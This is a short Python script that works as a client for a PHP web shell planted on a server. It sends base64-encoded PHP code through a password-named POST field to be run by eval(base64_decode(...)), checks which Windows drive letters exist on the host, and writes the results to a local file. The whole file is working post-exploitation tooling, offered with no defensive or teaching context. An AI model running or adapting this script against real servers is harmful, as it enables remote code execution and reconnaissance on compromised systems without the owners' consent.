import requests
import sys
import base64

i = 67
url = sys.argv[1]
password = sys.argv[2]
store_filename = sys.argv[3]

for k in range(10):
	value = f'is_dir("{chr(i)}:\\\\")?print("{chr(i)}"):0;'
	value = str(base64.b64encode(value.encode('utf-8')),'utf-8')
	data = {password:'eval(base64_decode($_POST[\'x\']));','x':value}
	r = requests.post(url=url,data=data)
	with open(store_filename,'a+') as f:
		if r.text!='\n' and r.text!='\r' and r.text!='' and r.text!='\r\n' and r.text!='\n\r':
			f.write(r.text+'\n')
	i = i + 1